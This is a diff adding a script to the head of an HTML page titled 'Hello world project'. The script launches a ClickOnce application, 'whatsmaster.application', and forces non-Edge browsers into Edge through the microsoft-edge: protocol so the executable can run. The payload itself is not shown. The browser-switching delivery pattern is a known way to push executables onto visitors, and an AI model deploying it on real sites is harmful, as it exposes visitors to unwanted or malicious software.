@@ -4,6 +4,38 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Hello world project</title>
+
+    <!-- UA Parser for browser detection -->
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>
+
+    <!-- ClickOnce deployment function -->
+    <script>
+      function startDownload() {
+        const clickonceLink = "/deploy/whatsmaster.application";
+        const uap = new UAParser();
+        const browserName = uap.getResult().browser.name;
+
+        console.log("Starting download, browser:", browserName);
+
+        if (browserName !== "Edge") {
+          const fullUrl = `microsoft-edge:${clickonceLink}`;
+          console.log("Redirecting to:", fullUrl);
+          window.location.href = fullUrl;
+        } else {
+          console.log("Using form method for Edge");
+          const form = document.createElement("form");
+          form.action = clickonceLink;
+          form.method = "GET";
+          form.target = "_blank";
+          document.body.appendChild(form);
+          form.submit();
+          document.body.removeChild(form);
+        }
+      }
+
+      // Make function globally available
+      window.startDownload = startDownload;
+    </script>
   </head>
 
   <body>
